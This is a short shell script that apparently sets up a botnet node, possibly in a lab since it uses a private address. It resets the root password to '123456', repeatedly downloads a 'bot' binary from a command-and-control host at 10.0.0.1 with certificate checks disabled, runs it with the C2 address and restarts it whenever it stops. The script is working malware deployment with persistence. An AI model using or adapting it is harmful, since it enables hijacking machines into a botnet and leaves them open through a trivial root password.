#!/usr/bin/env sh

echo -e "123456\n123456" | passwd root # could be any user

# loop until we have the bot
while /bin/true; do
  curl --insecure -s -L http://10.0.0.1:80/bot -o bot
  if [ -f "/bot" ]; then
      break
  fi
  sleep 5
done

chmod +x bot

# loop until we have IP (connman's issue)
while true;
do
  IPin=$(ip address show eth0 | grep 'inet ' | awk '{print $2}' | cut -f1 -d'/' | cut -f1 -d.)
  if [ -z "$IPin" ]
  then
        sleep 2
  else
        if [ $IPin -eq 10 ]; then break ; fi
        sleep 2
  fi
done

IP=`ifconfig eth0 | grep 'inet ' | cut -d: -f2 | awk '{ print $2}'` && CNC=10.0.0.1 && /bot $CNC $IP $CNC 0

while /bin/true; do

  ps aux | grep bot | grep -v grep
  P1_STATUS=$?

  #echo "PROCESS1 STATUS = $P1_STATUS " >> /var/log/golang/wrapper.log

  # If the greps above find anything, they will exit with 0 status
  # If they are not both 0, then something is wrong
  if [ $P1_STATUS -ne 0 ]; then
    IP=`ifconfig eth0 | grep 'inet ' | cut -d: -f2 | awk '{ print $2}'` && CNC=10.0.0.1 && /bot $CNC $IP $CNC 0
  else
    sleep 100
  fi
  sleep 5
done